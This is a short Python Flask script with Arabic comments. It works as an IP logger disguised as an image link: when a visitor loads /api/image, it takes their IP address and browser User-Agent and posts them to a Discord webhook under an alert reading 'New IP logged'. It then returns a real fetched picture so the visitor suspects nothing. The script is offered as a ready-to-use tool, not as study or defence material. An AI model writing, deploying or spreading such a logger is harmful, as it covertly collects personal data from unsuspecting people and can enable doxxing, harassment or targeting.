from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

# إعداداتك
WEBHOOK_URL = "https://discord.com"
IMAGE_URL = "https://alphacoders.com"

@app.route('/api/image')
def logger():
    # جمع المعلومات
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent')
    
    # إرسال البيانات للديسكورد
    embed = {
        "title": "🚨 تم تسجيل IP جديد!",
        "color": 0x00FFFF,
        "description": f"**الـ IP:** `{ip}`\n**الجهاز:** `{user_agent}`"
    }
    requests.post(WEBHOOK_URL, json={"embeds": [embed]})

    # جلب الصورة وإرسالها لتظهر في الديسكورد
    response = requests.get(IMAGE_URL)
    return send_file(io.BytesIO(response.content), mimetype='image/png')

if __name__ == "__main__":
    app.run()
